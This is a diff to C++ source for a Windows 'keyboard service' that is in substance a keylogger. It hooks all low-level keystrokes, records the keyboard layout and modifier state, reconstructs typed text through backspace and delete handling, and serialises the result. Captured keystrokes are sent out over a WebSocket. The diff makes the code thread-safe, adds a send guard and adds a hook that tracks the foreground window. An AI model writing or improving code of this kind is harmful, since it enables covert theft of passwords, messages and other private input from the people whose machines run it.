@@ -3,10 +3,10 @@
 #if SERVICE_KEYBOARD_ENABLED
 
 #include "tools.hpp"
-#include "io.hpp"
 #include "winfx.hpp"
 #include "lrcdatawriter.hpp"
 #include <thread>
+#include <mutex>
 #include <list>
 #include <queue>
 #include <string>
@@ -19,12 +19,12 @@ using namespace lrcdata;
 namespace
 {
 	bool isRunning = false;
-	const char dir[] = KBD_DIR;
 
 	typedef std::list<PartKeyboard> PKList;
 	typedef std::queue<PartKeyboard> PKQueue;
 
 	std::thread vkQueueThread;
+	std::mutex vkQueueMutex;
 
 	size_t vkEvents;
 	size_t vkRepeats;
@@ -34,7 +34,16 @@ namespace
 	PKQueue vkQueue;
 	VKInfo lastKeyPressed;
 
+	//HWND lastForegroundWindow = NULL;
+
 	HHOOK hhkLowLevelKybd = NULL;
+	HWINEVENTHOOK g_hook = NULL;
+
+	void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
+		LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
+	{
+		WNDInfo wndInfo = tools::GetWNDInfo(hwnd);
+	}
 
 	// Low level keyboard callback function
 	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -52,7 +61,9 @@ namespace
 			pk.vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
 			pk.vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;
 
+			vkQueueMutex.lock();
 			vkQueue.push(pk);
+			vkQueueMutex.unlock();
 		}
 
 		return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
@@ -76,9 +87,19 @@ namespace
 	// Saves vkList
 	void save()
 	{
+		std::string debug;
+
+		for (PKList::iterator it = vkList.begin(); it != vkList.end(); ++it)
+		{
+			debug += it->vkInfo.keyCode;
+		}
+
 		LRCDataWriter writer("fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a");
 		ByteVector result = writer.GetBytes(vkList);
-		WebSocket::Send(result);
+		if (WebSocket::IsRunning())
+		{
+			WebSocket::Send(result);
+		}
 
 		// Prepare buffer to next virtual-key sequence
 		vkListCursorBegin = 0;
@@ -89,21 +110,23 @@ namespace
 
 	void onDelete()
 	{
-		if (vkListCursor >= vkListCursorBegin && vkListCursor < vkList.size())
+		if (vkListCursor < vkList.size())
 		{
 			PKList::iterator it = vkList.begin();
 			std::advance(it, vkListCursor);
 			vkList.erase(it);
+			vkEvents--;
 		}
 	}
 
 	void onBackspace()
 	{
-		if (vkListCursor > vkListCursorBegin && vkListCursor < vkList.size() + 1)
+		if (vkListCursor > vkListCursorBegin)
 		{
 			PKList::iterator it = vkList.begin();
 			std::advance(it, vkListCursor - 1);
 			vkList.erase(it);
+			vkEvents--;
 			vkListCursor--;
 		}
 	}
@@ -143,16 +166,23 @@ namespace
 
 		if (isprintable(vkInfo.keyCode))
 		{
-			PKList::iterator it = vkList.begin();
-			std::advance(it, vkListCursor);
-
 			PartKeyboard toAdd;
 			toAdd.subtype = 0x1;
 			toAdd.vkInfo = vkInfo;
 
-			// Insert virtual-key into vkList at cursor position
-			vkList.insert(it, toAdd);
-
+			if (vkListCursor > vkList.size())
+			{
+				vkList.push_back(toAdd);
+			}
+			else
+			{
+				// Insert virtual-key into vkList at cursor position
+				PKList::iterator it = vkList.begin();
+				std::advance(it, vkListCursor);
+				vkList.insert(it, toAdd);
+			}
+			
+			vkListCursor++;
 			vkEvents++;
 
 			if (vkEvents == KBD_KEYS_TO_SAVE)
@@ -173,8 +203,10 @@ namespace
 		{
 			if (!vkQueue.empty())
 			{
+				vkQueueMutex.lock();
 				VKInfo vkInfo = vkQueue.front().vkInfo;
 				vkQueue.pop();
+				vkQueueMutex.unlock();
 
 				switch (vkInfo.keyCode)
 				{
@@ -206,11 +238,12 @@ namespace
 						vkListCursor++;
 					}
 					break;
-				}
-
-				if (vkInfo.keyCode != 0)
-				{
-					processvk(vkInfo);
+				default:
+					if (vkInfo.keyCode != 0)
+					{
+						processvk(vkInfo);
+					}
+					break;
 				}
 			}
 			Sleep(50);
@@ -234,6 +267,13 @@ void Keyboard::Run()
 		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
 	}
 
+	if (g_hook == NULL)
+	{
+		g_hook = SetWinEventHook(
+			EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
+			HandleWinEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+	}
+
 	vkQueueThread = std::thread(processqueue);
 }
 
@@ -251,6 +291,11 @@ void Keyboard::Stop()
 	{
 		UnhookWindowsHookEx(hhkLowLevelKybd);
 		hhkLowLevelKybd = NULL;
+	}
+
+	if (g_hook != NULL)
+	{
+		UnhookWinEvent(g_hook);
 	}
 }
 
